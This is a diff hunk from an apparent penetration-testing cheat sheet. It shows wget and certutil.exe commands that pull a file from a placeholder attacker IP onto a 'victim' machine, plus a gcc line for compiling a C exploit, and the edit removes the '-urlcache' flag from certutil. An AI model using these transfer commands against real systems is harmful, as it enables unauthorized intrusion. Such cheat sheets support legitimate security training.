@@ -175,7 +175,7 @@ Upload from victim:<br/>
 `wget 192.168.xxx.xxx:80/some_file`<br/>
 Error message "Address is already in use" -> `lsof -i:80` and kill process.<br/>
 ### CertUtil.exe
-`certutil.exe -urlcache -split -f 192.168.xxx.xxx:80/some_file`<br/>
+`certutil.exe -split -f 192.168.xxx.xxx:80/some_file`<br/>
 ## compile code:
 Exploit mostly written in c.<br/>
 `gcc -o exploit EXPLOIT.c `<br/>
